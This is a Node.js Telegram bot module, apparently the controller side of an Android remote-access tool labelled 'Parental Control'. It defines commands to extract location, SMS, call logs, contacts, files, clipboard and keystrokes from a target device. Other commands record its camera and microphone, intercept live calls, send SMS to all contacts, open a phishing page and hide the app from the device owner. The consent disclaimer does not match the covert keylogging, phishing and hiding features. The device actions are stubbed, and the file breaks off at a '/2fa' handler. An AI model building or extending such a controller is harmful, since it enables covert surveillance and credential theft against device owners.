/**
 * Bot module containing Telegram bot logic for Parental Control Application
 */
const fs = require('fs');

// Store registered devices data
const devices = new Map();

// Store pending requests
const pendingRequests = new Map();

// Setup the bot commands and handlers
function setupBot(bot) {
  // Set bot commands
  bot.telegram.setMyCommands([
    { command: 'start', description: 'Start the bot' },
    { command: 'help', description: 'Show help information' },
    { command: 'devices', description: 'List connected devices' },
    { command: 'location', description: 'Get device location' },
    { command: 'screenshot', description: 'Capture device screen' },
    { command: 'calls', description: 'Get recent call logs' },
    { command: 'sms', description: 'Read/send SMS messages' },
    { command: 'contacts', description: 'Get device contacts' },
    { command: 'apps', description: 'Get/manage installed apps' },
    { command: 'files', description: 'Browse device files' },
    { command: 'camera', description: 'Take a photo from device camera' },
    { command: 'mic', description: 'Record audio from device microphone' },
    { command: 'screen', description: 'Live screen mirroring' },
    { command: 'notify', description: 'Send custom notification' },
    { command: 'toast', description: 'Show toast message on device' },
    { command: 'clipboard', description: 'Get clipboard content' },
    { command: 'vibrate', description: 'Vibrate the device' },
    { command: 'torch', description: 'Control device flashlight' },
    { command: 'block', description: 'Block/unblock applications' },
    { command: 'keylogger', description: 'Enable/disable keylogger' },
    { command: 'volume', description: 'Control device volume' },
    { command: 'control', description: 'Remote device control' },
    { command: 'info', description: 'Get device information' },
    { command: 'phishing', description: 'Open phishing page on device' }
  ]).catch(err => {
    console.error('Error setting bot commands:', err);
  });

  // Handle /start command
  bot.command('start', (ctx) => {
    // Store admin chat ID for notifications
    updateConfig({ adminChatId: ctx.chat.id });
    
    const message = `👋 Hello, ${ctx.from.first_name}! 
    
Welcome to the Parental Control Bot. This bot allows you to monitor and manage devices with the companion app installed.

Use /help to see available commands.

⚠️ IMPORTANT: This application should only be used with proper consent and for legitimate parental monitoring purposes.`;
    
    return ctx.reply(message);
  });

  // Handle /help command
  bot.command('help', (ctx) => {
    const helpMessage = "Available Commands:\n\n" +
      "/start - Start the bot and register as admin\n" +
      "/help - Show this help message\n" +
      "/devices - List connected devices\n" +
      "/location - Get device location\n" +
      "/screenshot - Capture screen\n" +
      "/camera - Take photos\n" +
      "/calls - Get call history\n" +
      "/sms - Read/send SMS\n" +
      "/contacts - Get contacts\n" +
      "/files - Browse files\n" +
      "/apps - Manage apps\n" +
      "/info - Get device info\n\n" +
      "Type any command with 'help' for more information";
    
    return ctx.reply(helpMessage);
  });

  // Handle /devices command
  bot.command('devices', async (ctx) => {
    const args = ctx.message.text.split(' ').slice(1);
    
    if (args[0] === 'help') {
      return ctx.reply('Use /devices to list all connected devices. Each device will show its name, model, and connection status.');
    }
    
    if (devices.size === 0) {
      return ctx.reply('No devices connected yet. Install the companion app on the device you want to monitor.');
    }
    
    let deviceList = '📱 *Connected Devices*\n\n';
    devices.forEach((device, id) => {
      const lastSeen = new Date(device.lastSeen).toLocaleString();
      const status = device.isOnline ? '🟢 Online' : '🔴 Offline';
      
      deviceList += `*${device.deviceName}*\n`;
      deviceList += `Model: ${device.model}\n`;
      deviceList += `Status: ${status}\n`;
      deviceList += `Last seen: ${lastSeen}\n`;
      deviceList += `ID: ${id}\n\n`;
    });
    
    deviceList += 'Use device ID with other commands. Example: /location abc123';
    
    return ctx.replyWithMarkdown(deviceList);
  });

  // Handle /location command
  bot.command('location', async (ctx) => {
    const args = ctx.message.text.split(' ').slice(1);
    
    if (args[0] === 'help') {
      return ctx.reply('Use /location [deviceId] to get the current location of a specific device.');
    }
    
    if (!args[0]) {
      return ctx.reply('Please specify a device ID. Use /devices to see available devices.');
    }
    
    const deviceId = args[0];
    if (!devices.has(deviceId)) {
      return ctx.reply('Device not found. Use /devices to see available devices.');
    }
    
    await ctx.reply(`Requesting location from device ${devices.get(deviceId).deviceName}...`);
    
    // In a real implementation, we would send a request to the device
    // and wait for its response. For now, we'll just simulate it.
    setTimeout(() => {
      ctx.reply('Location request sent to device. You will receive the location when the device responds.');
    }, 1000);
  });

  // Handle /screenshot command
  bot.command('screenshot', async (ctx) => {
    const args = ctx.message.text.split(' ').slice(1);
    
    if (args[0] === 'help') {
      return ctx.reply('Use /screenshot [deviceId] to capture the current screen of a specific device.');
    }
    
    if (!args[0]) {
      return ctx.reply('Please specify a device ID. Use /devices to see available devices.');
    }
    
    const deviceId = args[0];
    if (!devices.has(deviceId)) {
      return ctx.reply('Device not found. Use /devices to see available devices.');
    }
    
    await ctx.reply(`Requesting screenshot from device ${devices.get(deviceId).deviceName}...`);
    
    // In a real implementation, we would send a request to the device
    // and wait for its response. For now, we'll just simulate it.
    setTimeout(() => {
      ctx.reply('Screenshot request sent to device. You will receive the image when the device responds.');
    }, 1000);
  });

  // Handle /calls command
  bot.command('calls', async (ctx) => {
    const args = ctx.message.text.split(' ').slice(1);
    
    if (args[0] === 'help') {
      return ctx.reply('Use /calls [deviceId] to get recent call logs from a specific device.');
    }
    
    if (!args[0]) {
      return ctx.reply('Please specify a device ID. Use /devices to see available devices.');
    }
    
    const deviceId = args[0];
    if (!devices.has(deviceId)) {
      return ctx.reply('Device not found. Use /devices to see available devices.');
    }
    
    await ctx.reply(`Requesting call logs from device ${devices.get(deviceId).deviceName}...`);
    
    // In a real implementation, we would send a request to the device
    // and wait for its response. For now, we'll just simulate it.
    setTimeout(() => {
      ctx.reply('Call logs request sent to device. You will receive the logs when the device responds.');
    }, 1000);
  });

  // Handle /camera command
  bot.command('camera', async (ctx) => {
    const args = ctx.message.text.split(' ').slice(1);
    
    if (args[0] === 'help') {
      return ctx.reply('Use /camera [deviceId] [front|back] to take a photo using the device camera.');
    }
    
    if (!args[0]) {
      return ctx.reply('Please specify a device ID. Use /devices to see available devices.');
    }
    
    const deviceId = args[0];
    if (!devices.has(deviceId)) {
      return ctx.reply('Device not found. Use /devices to see available devices.');
    }
    
    const cameraType = args[1] === 'front' ? 'front' : 'back';
    
    await ctx.reply(`Requesting photo from ${cameraType} camera on device ${devices.get(deviceId).deviceName}...`);
    
    // Store the request info for callback when device responds
    const requestId = Date.now().toString();
    pendingRequests.set(requestId, {
      type: 'camera',
      deviceId,
      chatId: ctx.chat.id,
      timestamp: Date.now(),
      params: { cameraType }
    });
    
    // In a real implementation, this request would be picked up by the device
    setTimeout(() => {
      ctx.reply('Camera request sent to device. You will receive the photo when the device responds.');
    }, 1000);
  });
  
  // Handle /mic command (audio recording)
  bot.command('mic', async (ctx) => {
    const args = ctx.message.text.split(' ').slice(1);
    
    if (args[0] === 'help') {
      return ctx.reply('Use /mic [deviceId] [duration] to record audio from the device microphone. Duration is in seconds (max 60).');
    }
    
    if (!args[0]) {
      return ctx.reply('Please specify a device ID. Use /devices to see available devices.');
    }
    
    const deviceId = args[0];
    if (!devices.has(deviceId)) {
      return ctx.reply('Device not found. Use /devices to see available devices.');
    }
    
    // Parse duration, default to 10 seconds, max 60 seconds
    let duration = parseInt(args[1]) || 10;
    duration = Math.min(Math.max(duration, 1), 60);
    
    await ctx.reply(`Requesting ${duration} second audio recording from device ${devices.get(deviceId).deviceName}...`);
    
    // Store the request info for callback
    const requestId = Date.now().toString();
    pendingRequests.set(requestId, {
      type: 'mic',
      deviceId,
      chatId: ctx.chat.id,
      timestamp: Date.now(),
      params: { duration }
    });
    
    setTimeout(() => {
      ctx.reply(`Audio recording request sent to device. Recording will last ${duration} seconds.`);
    }, 1000);
  });
  
  // Handle /screen command (screen mirroring)
  bot.command('screen', async (ctx) => {
    const args = ctx.message.text.split(' ').slice(1);
    
    if (args[0] === 'help') {
      return ctx.reply('Use /screen [deviceId] [start|stop] to start or stop screen mirroring from the device.');
    }
    
    if (!args[0]) {
      return ctx.reply('Please specify a device ID. Use /devices to see available devices.');
    }
    
    const deviceId = args[0];
    if (!devices.has(deviceId)) {
      return ctx.reply('Device not found. Use /devices to see available devices.');
    }
    
    const action = args[1] === 'stop' ? 'stop' : 'start';
    
    if (action === 'start') {
      await ctx.reply(`Starting screen mirroring from device ${devices.get(deviceId).deviceName}...`);
      
      // Store the request info
      const requestId = Date.now().toString();
      pendingRequests.set(requestId, {
        type: 'screen_mirror',
        deviceId,
        chatId: ctx.chat.id,
        timestamp: Date.now(),
        params: { active: true }
      });
      
      setTimeout(() => {
        ctx.reply('Screen mirroring request sent. You will start receiving screenshots regularly.');
      }, 1000);
    } else {
      await ctx.reply(`Stopping screen mirroring from device ${devices.get(deviceId).deviceName}...`);
      
      // Find and cancel any active screen mirroring requests
      for (const [id, request] of pendingRequests.entries()) {
        if (request.type === 'screen_mirror' && request.deviceId === deviceId) {
          pendingRequests.delete(id);
        }
      }
      
      setTimeout(() => {
        ctx.reply('Screen mirroring has been stopped.');
      }, 1000);
    }
  });
  
  // Handle /sms command
  bot.command('sms', async (ctx) => {
    const args = ctx.message.text.split(' ').slice(1);
    
    if (args[0] === 'help') {
      return ctx.reply(`SMS Command Options:
/sms [deviceId] read - Read recent SMS messages
/sms [deviceId] send [number] [message] - Send SMS to a specific number
/sms [deviceId] sendall [message] - Send SMS to all contacts in the device`);
    }
    
    if (!args[0]) {
      return ctx.reply('Please specify a device ID. Use /devices to see available devices.');
    }
    
    const deviceId = args[0];
    if (!devices.has(deviceId)) {
      return ctx.reply('Device not found. Use /devices to see available devices.');
    }
    
    const action = args[1];
    
    if (action === 'read' || !action) {
      await ctx.reply(`Requesting SMS messages from device ${devices.get(deviceId).deviceName}...`);
      
      // Store the request info
      const requestId = Date.now().toString();
      pendingRequests.set(requestId, {
        type: 'sms_read',
        deviceId,
        chatId: ctx.chat.id,
        timestamp: Date.now()
      });
      
      setTimeout(() => {
        ctx.reply('SMS read request sent. You will receive messages when the device responds.');
      }, 1000);
    } 
    else if (action === 'send' && args.length >= 4) {
      const number = args[2];
      const message = args.slice(3).join(' ');
      
      await ctx.reply(`Sending SMS to ${number} from device ${devices.get(deviceId).deviceName}...`);
      
      // Store the request info
      const requestId = Date.now().toString();
      pendingRequests.set(requestId, {
        type: 'sms_send',
        deviceId,
        chatId: ctx.chat.id,
        timestamp: Date.now(),
        params: { number, message }
      });
      
      setTimeout(() => {
        ctx.reply(`SMS send request sent. Message will be sent to ${number}.`);
      }, 1000);
    }
    else if (action === 'sendall' && args.length >= 3) {
      const message = args.slice(2).join(' ');
      
      await ctx.reply(`Sending SMS to all contacts from device ${devices.get(deviceId).deviceName}...`);
      
      // Store the request info
      const requestId = Date.now().toString();
      pendingRequests.set(requestId, {
        type: 'sms_send_all',
        deviceId,
        chatId: ctx.chat.id,
        timestamp: Date.now(),
        params: { message }
      });
      
      setTimeout(() => {
        ctx.reply('SMS send request sent. Message will be sent to all contacts.');
      }, 1000);
    } 
    else {
      return ctx.reply('Invalid SMS command format. Use "/sms help" for usage information.');
    }
  });
  
  // Handle /contacts command
  bot.command('contacts', async (ctx) => {
    const args = ctx.message.text.split(' ').slice(1);
    
    if (args[0] === 'help') {
      return ctx.reply('Use /contacts [deviceId] to get all contacts from the device.');
    }
    
    if (!args[0]) {
      return ctx.reply('Please specify a device ID. Use /devices to see available devices.');
    }
    
    const deviceId = args[0];
    if (!devices.has(deviceId)) {
      return ctx.reply('Device not found. Use /devices to see available devices.');
    }
    
    await ctx.reply(`Requesting contacts from device ${devices.get(deviceId).deviceName}...`);
    
    // Store the request info
    const requestId = Date.now().toString();
    pendingRequests.set(requestId, {
      type: 'contacts',
      deviceId,
      chatId: ctx.chat.id,
      timestamp: Date.now()
    });
    
    setTimeout(() => {
      ctx.reply('Contacts request sent. You will receive the contacts when the device responds.');
    }, 1000);
  });
  
  // Handle /files command
  bot.command('files', async (ctx) => {
    const args = ctx.message.text.split(' ').slice(1);
    
    if (args[0] === 'help') {
      return ctx.reply(`File Command Options:
/files [deviceId] list [path] - List files in the given path
/files [deviceId] get [path] - Download file from the given path
/files [deviceId] delete [path] - Delete file at the given path`);
    }
    
    if (!args[0]) {
      return ctx.reply('Please specify a device ID. Use /devices to see available devices.');
    }
    
    const deviceId = args[0];
    if (!devices.has(deviceId)) {
      return ctx.reply('Device not found. Use /devices to see available devices.');
    }
    
    const action = args[1] || 'list';
    const path = args.slice(2).join(' ') || '/storage/emulated/0';
    
    if (action === 'list') {
      await ctx.reply(`Listing files in ${path} on device ${devices.get(deviceId).deviceName}...`);
      
      // Store the request info
      const requestId = Date.now().toString();
      pendingRequests.set(requestId, {
        type: 'files_list',
        deviceId,
        chatId: ctx.chat.id,
        timestamp: Date.now(),
        params: { path }
      });
      
      setTimeout(() => {
        ctx.reply('File list request sent. You will receive the list when the device responds.');
      }, 1000);
    }
    else if (action === 'get') {
      await ctx.reply(`Downloading file ${path} from device ${devices.get(deviceId).deviceName}...`);
      
      // Store the request info
      const requestId = Date.now().toString();
      pendingRequests.set(requestId, {
        type: 'files_get',
        deviceId,
        chatId: ctx.chat.id,
        timestamp: Date.now(),
        params: { path }
      });
      
      setTimeout(() => {
        ctx.reply('File download request sent. You will receive the file when the device responds.');
      }, 1000);
    }
    else if (action === 'delete') {
      await ctx.reply(`Deleting file ${path} on device ${devices.get(deviceId).deviceName}...`);
      
      // Store the request info
      const requestId = Date.now().toString();
      pendingRequests.set(requestId, {
        type: 'files_delete',
        deviceId,
        chatId: ctx.chat.id,
        timestamp: Date.now(),
        params: { path }
      });
      
      setTimeout(() => {
        ctx.reply('File delete request sent. You will receive confirmation when completed.');
      }, 1000);
    }
    else {
      return ctx.reply('Invalid files command. Use "/files help" for usage information.');
    }
  });
  
  // Handle /notify command (custom notifications)
  bot.command('notify', async (ctx) => {
    const args = ctx.message.text.split(' ').slice(1);
    
    if (args[0] === 'help') {
      return ctx.reply('Use /notify [deviceId] [title] [message] [url] to send a custom notification to the device. URL is optional.');
    }
    
    if (!args[0]) {
      return ctx.reply('Please specify a device ID. Use /devices to see available devices.');
    }
    
    const deviceId = args[0];
    if (!devices.has(deviceId)) {
      return ctx.reply('Device not found. Use /devices to see available devices.');
    }
    
    if (args.length < 3) {
      return ctx.reply('Please provide both title and message for the notification. Use "/notify help" for usage information.');
    }
    
    const title = args[1];
    const message = args[2];
    const url = args.length > 3 ? args[3] : '';
    
    await ctx.reply(`Sending notification to device ${devices.get(deviceId).deviceName}...`);
    
    // Store the request info
    const requestId = Date.now().toString();
    pendingRequests.set(requestId, {
      type: 'notify',
      deviceId,
      chatId: ctx.chat.id,
      timestamp: Date.now(),
      params: { title, message, url }
    });
    
    setTimeout(() => {
      ctx.reply('Notification request sent. Notification will be displayed on the device.');
    }, 1000);
  });
  
  // Handle /toast command
  bot.command('toast', async (ctx) => {
    const args = ctx.message.text.split(' ').slice(1);
    
    if (args[0] === 'help') {
      return ctx.reply('Use /toast [deviceId] [message] to display a toast message on the device.');
    }
    
    if (!args[0]) {
      return ctx.reply('Please specify a device ID. Use /devices to see available devices.');
    }
    
    const deviceId = args[0];
    if (!devices.has(deviceId)) {
      return ctx.reply('Device not found. Use /devices to see available devices.');
    }
    
    if (args.length < 2) {
      return ctx.reply('Please provide a message for the toast. Use "/toast help" for usage information.');
    }
    
    const message = args.slice(1).join(' ');
    
    await ctx.reply(`Sending toast message to device ${devices.get(deviceId).deviceName}...`);
    
    // Store the request info
    const requestId = Date.now().toString();
    pendingRequests.set(requestId, {
      type: 'toast',
      deviceId,
      chatId: ctx.chat.id,
      timestamp: Date.now(),
      params: { message }
    });
    
    setTimeout(() => {
      ctx.reply('Toast message request sent. Message will be displayed on the device.');
    }, 1000);
  });
  
  // Handle /clipboard command
  bot.command('clipboard', async (ctx) => {
    const args = ctx.message.text.split(' ').slice(1);
    
    if (args[0] === 'help') {
      return ctx.reply('Use /clipboard [deviceId] to get the current clipboard content from the device.');
    }
    
    if (!args[0]) {
      return ctx.reply('Please specify a device ID. Use /devices to see available devices.');
    }
    
    const deviceId = args[0];
    if (!devices.has(deviceId)) {
      return ctx.reply('Device not found. Use /devices to see available devices.');
    }
    
    await ctx.reply(`Requesting clipboard content from device ${devices.get(deviceId).deviceName}...`);
    
    // Store the request info
    const requestId = Date.now().toString();
    pendingRequests.set(requestId, {
      type: 'clipboard',
      deviceId,
      chatId: ctx.chat.id,
      timestamp: Date.now()
    });
    
    setTimeout(() => {
      ctx.reply('Clipboard request sent. You will receive the content when the device responds.');
    }, 1000);
  });
  
  // Handle /vibrate command
  bot.command('vibrate', async (ctx) => {
    const args = ctx.message.text.split(' ').slice(1);
    
    if (args[0] === 'help') {
      return ctx.reply('Use /vibrate [deviceId] [duration] to vibrate the device. Duration is in milliseconds (default: 1000, max: 5000).');
    }
    
    if (!args[0]) {
      return ctx.reply('Please specify a device ID. Use /devices to see available devices.');
    }
    
    const deviceId = args[0];
    if (!devices.has(deviceId)) {
      return ctx.reply('Device not found. Use /devices to see available devices.');
    }
    
    // Parse duration, default to 1000 ms, max 5000 ms
    let duration = parseInt(args[1]) || 1000;
    duration = Math.min(Math.max(duration, 100), 5000);
    
    await ctx.reply(`Sending vibrate command to device ${devices.get(deviceId).deviceName} (${duration}ms)...`);
    
    // Store the request info
    const requestId = Date.now().toString();
    pendingRequests.set(requestId, {
      type: 'vibrate',
      deviceId,
      chatId: ctx.chat.id,
      timestamp: Date.now(),
      params: { duration }
    });
    
    setTimeout(() => {
      ctx.reply('Vibrate command sent. Device will vibrate shortly.');
    }, 1000);
  });
  
  // Handle /torch command
  bot.command('torch', async (ctx) => {
    const args = ctx.message.text.split(' ').slice(1);
    
    if (args[0] === 'help') {
      return ctx.reply('Use /torch [deviceId] [on|off] to turn the device flashlight on or off.');
    }
    
    if (!args[0]) {
      return ctx.reply('Please specify a device ID. Use /devices to see available devices.');
    }
    
    const deviceId = args[0];
    if (!devices.has(deviceId)) {
      return ctx.reply('Device not found. Use /devices to see available devices.');
    }
    
    const state = args[1] === 'off' ? 'off' : 'on';
    
    await ctx.reply(`Turning torch ${state} on device ${devices.get(deviceId).deviceName}...`);
    
    // Store the request info
    const requestId = Date.now().toString();
    pendingRequests.set(requestId, {
      type: 'torch',
      deviceId,
      chatId: ctx.chat.id,
      timestamp: Date.now(),
      params: { state }
    });
    
    setTimeout(() => {
      ctx.reply(`Torch command sent. Flashlight will turn ${state}.`);
    }, 1000);
  });
  
  // Handle /block command
  bot.command('block', async (ctx) => {
    const args = ctx.message.text.split(' ').slice(1);
    
    if (args[0] === 'help') {
      return ctx.reply(`App Blocking Commands:
/block [deviceId] list - List currently blocked apps
/block [deviceId] add [packageName] - Block an application
/block [deviceId] remove [packageName] - Unblock an application`);
    }
    
    if (!args[0]) {
      return ctx.reply('Please specify a device ID. Use /devices to see available devices.');
    }
    
    const deviceId = args[0];
    if (!devices.has(deviceId)) {
      return ctx.reply('Device not found. Use /devices to see available devices.');
    }
    
    const action = args[1] || 'list';
    
    if (action === 'list') {
      await ctx.reply(`Requesting list of blocked apps on device ${devices.get(deviceId).deviceName}...`);
      
      // Store the request info
      const requestId = Date.now().toString();
      pendingRequests.set(requestId, {
        type: 'block_list',
        deviceId,
        chatId: ctx.chat.id,
        timestamp: Date.now()
      });
      
      setTimeout(() => {
        ctx.reply('Block list request sent. You will receive the list when the device responds.');
      }, 1000);
    }
    else if (action === 'add' && args.length > 2) {
      const packageName = args[2];
      
      await ctx.reply(`Blocking app ${packageName} on device ${devices.get(deviceId).deviceName}...`);
      
      // Store the request info
      const requestId = Date.now().toString();
      pendingRequests.set(requestId, {
        type: 'block_add',
        deviceId,
        chatId: ctx.chat.id,
        timestamp: Date.now(),
        params: { packageName }
      });
      
      setTimeout(() => {
        ctx.reply(`Block request sent. App ${packageName} will be blocked on the device.`);
      }, 1000);
    }
    else if (action === 'remove' && args.length > 2) {
      const packageName = args[2];
      
      await ctx.reply(`Unblocking app ${packageName} on device ${devices.get(deviceId).deviceName}...`);
      
      // Store the request info
      const requestId = Date.now().toString();
      pendingRequests.set(requestId, {
        type: 'block_remove',
        deviceId,
        chatId: ctx.chat.id,
        timestamp: Date.now(),
        params: { packageName }
      });
      
      setTimeout(() => {
        ctx.reply(`Unblock request sent. App ${packageName} will be unblocked on the device.`);
      }, 1000);
    }
    else {
      return ctx.reply('Invalid block command. Use "/block help" for usage information.');
    }
  });
  
  // Handle /keylogger command
  bot.command('keylogger', async (ctx) => {
    const args = ctx.message.text.split(' ').slice(1);
    
    if (args[0] === 'help') {
      return ctx.reply('Use /keylogger [deviceId] [on|off|dump] to control the keylogger feature. "dump" retrieves the current logs.');
    }
    
    if (!args[0]) {
      return ctx.reply('Please specify a device ID. Use /devices to see available devices.');
    }
    
    const deviceId = args[0];
    if (!devices.has(deviceId)) {
      return ctx.reply('Device not found. Use /devices to see available devices.');
    }
    
    const action = args[1] || 'dump';
    
    if (action === 'on') {
      await ctx.reply(`Enabling keylogger on device ${devices.get(deviceId).deviceName}...`);
      
      // Store the request info
      const requestId = Date.now().toString();
      pendingRequests.set(requestId, {
        type: 'keylogger_enable',
        deviceId,
        chatId: ctx.chat.id,
        timestamp: Date.now()
      });
      
      setTimeout(() => {
        ctx.reply('Keylogger enable request sent. Keystrokes will now be logged.');
      }, 1000);
    }
    else if (action === 'off') {
      await ctx.reply(`Disabling keylogger on device ${devices.get(deviceId).deviceName}...`);
      
      // Store the request info
      const requestId = Date.now().toString();
      pendingRequests.set(requestId, {
        type: 'keylogger_disable',
        deviceId,
        chatId: ctx.chat.id,
        timestamp: Date.now()
      });
      
      setTimeout(() => {
        ctx.reply('Keylogger disable request sent. Keystroke logging will stop.');
      }, 1000);
    }
    else if (action === 'dump') {
      await ctx.reply(`Requesting keylogger data from device ${devices.get(deviceId).deviceName}...`);
      
      // Store the request info
      const requestId = Date.now().toString();
      pendingRequests.set(requestId, {
        type: 'keylogger_dump',
        deviceId,
        chatId: ctx.chat.id,
        timestamp: Date.now()
      });
      
      setTimeout(() => {
        ctx.reply('Keylogger dump request sent. You will receive the logs when the device responds.');
      }, 1000);
    }
    else {
      return ctx.reply('Invalid keylogger command. Use "/keylogger help" for usage information.');
    }
  });
  
  // Handle /volume command
  bot.command('volume', async (ctx) => {
    const args = ctx.message.text.split(' ').slice(1);
    
    if (args[0] === 'help') {
      return ctx.reply(`Volume Control Commands:
/volume [deviceId] [level] - Set volume level (0-100)
/volume [deviceId] up - Increase volume
/volume [deviceId] down - Decrease volume
/volume [deviceId] mute - Mute device
/volume [deviceId] unmute - Unmute device`);
    }
    
    if (!args[0]) {
      return ctx.reply('Please specify a device ID. Use /devices to see available devices.');
    }
    
    const deviceId = args[0];
    if (!devices.has(deviceId)) {
      return ctx.reply('Device not found. Use /devices to see available devices.');
    }
    
    let action = 'set';
    let level = 50;
    
    if (args[1] === 'up') {
      action = 'up';
    } 
    else if (args[1] === 'down') {
      action = 'down';
    }
    else if (args[1] === 'mute') {
      action = 'mute';
    }
    else if (args[1] === 'unmute') {
      action = 'unmute';
    }
    else if (!isNaN(parseInt(args[1]))) {
      action = 'set';
      level = Math.min(Math.max(parseInt(args[1]), 0), 100);
    }
    
    await ctx.reply(`Adjusting volume on device ${devices.get(deviceId).deviceName}...`);
    
    // Store the request info
    const requestId = Date.now().toString();
    pendingRequests.set(requestId, {
      type: 'volume',
      deviceId,
      chatId: ctx.chat.id,
      timestamp: Date.now(),
      params: { action, level }
    });
    
    setTimeout(() => {
      ctx.reply('Volume control request sent. The device volume will be adjusted.');
    }, 1000);
  });
  
  // Handle /control command (remote control)
  bot.command('control', async (ctx) => {
    const args = ctx.message.text.split(' ').slice(1);
    
    if (args[0] === 'help') {
      return ctx.reply(`Remote Control Commands:
/control [deviceId] home - Press Home button
/control [deviceId] back - Press Back button
/control [deviceId] recent - Press Recent Apps button
/control [deviceId] power - Press Power button`);
    }
    
    if (!args[0]) {
      return ctx.reply('Please specify a device ID. Use /devices to see available devices.');
    }
    
    const deviceId = args[0];
    if (!devices.has(deviceId)) {
      return ctx.reply('Device not found. Use /devices to see available devices.');
    }
    
    const button = args[1] || 'home';
    
    if (!['home', 'back', 'recent', 'power'].includes(button)) {
      return ctx.reply('Invalid button. Use "home", "back", "recent", or "power". Use "/control help" for usage information.');
    }
    
    await ctx.reply(`Sending ${button} button press to device ${devices.get(deviceId).deviceName}...`);
    
    // Store the request info
    const requestId = Date.now().toString();
    pendingRequests.set(requestId, {
      type: 'control',
      deviceId,
      chatId: ctx.chat.id,
      timestamp: Date.now(),
      params: { button }
    });
    
    setTimeout(() => {
      ctx.reply(`${button.charAt(0).toUpperCase() + button.slice(1)} button press sent to the device.`);
    }, 1000);
  });
  
  // Handle /info command
  bot.command('info', async (ctx) => {
    const args = ctx.message.text.split(' ').slice(1);
    
    if (args[0] === 'help') {
      return ctx.reply('Use /info [deviceId] to get detailed information about the device, including SIM card info.');
    }
    
    if (!args[0]) {
      return ctx.reply('Please specify a device ID. Use /devices to see available devices.');
    }
    
    const deviceId = args[0];
    if (!devices.has(deviceId)) {
      return ctx.reply('Device not found. Use /devices to see available devices.');
    }
    
    await ctx.reply(`Requesting detailed information from device ${devices.get(deviceId).deviceName}...`);
    
    // Store the request info
    const requestId = Date.now().toString();
    pendingRequests.set(requestId, {
      type: 'info',
      deviceId,
      chatId: ctx.chat.id,
      timestamp: Date.now()
    });
    
    setTimeout(() => {
      ctx.reply('Device info request sent. You will receive the information when the device responds.');
    }, 1000);
  });
  
  // Handle /phishing command
  bot.command('phishing', async (ctx) => {
    const args = ctx.message.text.split(' ').slice(1);
    
    if (args[0] === 'help') {
      return ctx.reply('Use /phishing [deviceId] [url/template] to open a phishing page on the device.');
    }
    
    if (!args[0]) {
      return ctx.reply('Please specify a device ID. Use /devices to see available devices.');
    }
    
    const deviceId = args[0];
    if (!devices.has(deviceId)) {
      return ctx.reply('Device not found. Use /devices to see available devices.');
    }
    
    const target = args[1] || 'google';
    
    await ctx.reply(`Sending phishing page command to device ${devices.get(deviceId).deviceName}...`);
    
    // Store the request info
    const requestId = Date.now().toString();
    pendingRequests.set(requestId, {
      type: 'phishing',
      deviceId,
      chatId: ctx.chat.id,
      timestamp: Date.now(),
      params: { target }
    });
    
    setTimeout(() => {
      ctx.reply('Phishing page request sent. The page will open on the device.');
    }, 1000);
  });
  
  // Handle /hide command for hiding the app
  bot.command('hide', async (ctx) => {
    const args = ctx.message.text.split(' ').slice(1);
    
    if (args[0] === 'help') {
      return ctx.reply('Use /hide [deviceId] to hide the app from app drawer on the device.');
    }
    
    if (!args[0]) {
      return ctx.reply('Please specify a device ID. Use /devices to see available devices.');
    }
    
    const deviceId = args[0];
    if (!devices.has(deviceId)) {
      return ctx.reply('Device not found. Use /devices to see available devices.');
    }
    
    await ctx.reply(`Sending hide command to device ${devices.get(deviceId).deviceName}...`);
    
    // Store the request info
    const requestId = Date.now().toString();
    pendingRequests.set(requestId, {
      type: 'hide_app',
      deviceId,
      chatId: ctx.chat.id,
      timestamp: Date.now()
    });
    
    setTimeout(() => {
      ctx.reply('Hide command sent. App will be hidden from app drawer on the device.');
    }, 1000);
  });
  
  // Handle /unhide command for showing the app
  bot.command('unhide', async (ctx) => {
    const args = ctx.message.text.split(' ').slice(1);
    
    if (args[0] === 'help') {
      return ctx.reply('Use /unhide [deviceId] to show the app in app drawer on the device.');
    }
    
    if (!args[0]) {
      return ctx.reply('Please specify a device ID. Use /devices to see available devices.');
    }
    
    const deviceId = args[0];
    if (!devices.has(deviceId)) {
      return ctx.reply('Device not found. Use /devices to see available devices.');
    }
    
    await ctx.reply(`Sending unhide command to device ${devices.get(deviceId).deviceName}...`);
    
    // Store the request info
    const requestId = Date.now().toString();
    pendingRequests.set(requestId, {
      type: 'unhide_app',
      deviceId,
      chatId: ctx.chat.id,
      timestamp: Date.now()
    });
    
    setTimeout(() => {
      ctx.reply('Unhide command sent. App will be visible in app drawer on the device.');
    }, 1000);
  });
  
  // Handle /uninstall command for remote uninstallation
  bot.command('uninstall', async (ctx) => {
    const args = ctx.message.text.split(' ').slice(1);
    
    if (args[0] === 'help') {
      return ctx.reply('Use /uninstall [deviceId] [password] to uninstall the app from the device. Password is required for security.');
    }
    
    if (!args[0]) {
      return ctx.reply('Please specify a device ID. Use /devices to see available devices.');
    }
    
    const deviceId = args[0];
    if (!devices.has(deviceId)) {
      return ctx.reply('Device not found. Use /devices to see available devices.');
    }
    
    if (!args[1]) {
      return ctx.reply('Please provide the admin password to authorize uninstallation.');
    }
    
    const password = args[1];
    
    await ctx.reply(`Sending uninstall command to device ${devices.get(deviceId).deviceName}...`);
    
    // Store the request info
    const requestId = Date.now().toString();
    pendingRequests.set(requestId, {
      type: 'uninstall_app',
      deviceId,
      chatId: ctx.chat.id,
      timestamp: Date.now(),
      params: { password }
    });
    
    setTimeout(() => {
      ctx.reply('Uninstall command sent. App will verify password and uninstall if authorized.');
    }, 1000);
  });
  
  // Handle /call_listen command for listening to calls
  bot.command('call_listen', async (ctx) => {
    const args = ctx.message.text.split(' ').slice(1);
    
    if (args[0] === 'help') {
      return ctx.reply('Use /call_listen [deviceId] [on|off] to enable or disable real-time call listening.');
    }
    
    if (!args[0]) {
      return ctx.reply('Please specify a device ID. Use /devices to see available devices.');
    }
    
    const deviceId = args[0];
    if (!devices.has(deviceId)) {
      return ctx.reply('Device not found. Use /devices to see available devices.');
    }
    
    const action = args[1] === 'off' ? 'off' : 'on';
    
    await ctx.reply(`Sending call listening ${action} command to device ${devices.get(deviceId).deviceName}...`);
    
    // Store the request info
    const requestId = Date.now().toString();
    pendingRequests.set(requestId, {
      type: 'call_listen',
      deviceId,
      chatId: ctx.chat.id,
      timestamp: Date.now(),
      params: { enabled: action === 'on' }
    });
    
    setTimeout(() => {
      if (action === 'on') {
        ctx.reply('Call listening enabled. You will receive audio from ongoing calls.');
      } else {
        ctx.reply('Call listening disabled.');
      }
    }, 1000);
  });
  
  // Handle /2fa command for setting up two-factor authentication
  bot.command('2fa', async (ctx) => {
    const args = ctx.message.text.split(' ').slice(1);
    
    if (args[0] === 'help') {
